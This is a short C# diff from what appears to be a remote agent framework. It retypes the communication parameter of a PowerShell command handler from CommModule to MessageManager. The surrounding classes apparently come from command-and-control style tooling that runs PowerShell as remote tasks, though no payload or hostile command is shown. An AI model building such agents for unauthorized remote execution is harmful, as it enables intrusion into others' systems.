@@ -12,7 +12,7 @@ namespace Agent.Commands
     public class PowerShellCommand : AgentCommand
     {
         public override string Name => "powershell";
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
         {
             using (var runner = new PowerShellRunner())
             {
